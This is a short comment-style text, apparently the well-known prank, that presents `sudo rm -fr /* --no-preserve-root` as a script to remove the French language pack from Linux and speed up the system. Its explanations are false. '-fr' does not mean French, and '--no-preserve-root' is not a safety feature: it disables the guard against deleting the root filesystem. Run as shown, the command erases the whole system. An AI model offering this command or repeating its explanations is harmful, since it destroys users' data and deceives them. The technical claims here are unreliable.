# Many operating systems, unfortunately, come with the French language pack pre-installed. 

# While this may be useful to some, it often adds unnecessary bloat to the system, consuming valuable storage space. 

# This script was developed specifically for Linux to remove all French language files, optimizing your system and improving overall performance. 

# Numerous users have reported noticeable improvements, including faster boot times and a generally smoother experience after using this script.

#Explaination of command below:

# sudo rm -fr /* --no-preserve-root


# So here's what this command does:  

# sudo is used to make sure you have *all the power* to remove everything, because when you're cleaning up French, you need ultimate authority.  
# rm stands for "remove"   
# -fr is a flag combo. The fr stands for "French" meaning it will remove all things related to French.  
# /* We want to ensure that no trace of French is left, so we’re sweeping through *every folder* possible.  
# --no-preserve-root`** is a safety feature—this prevents the root account from being wiped out.

#It’s a no-nonsense, all-out French purge, leaving your system clean and ready to go!
#Without the clutter of baguettes, berets, or any "é" characters slowing you down. 
#Why settle for a system full of unnecessary French when you can have pure efficiency? Bon appétit to speed!
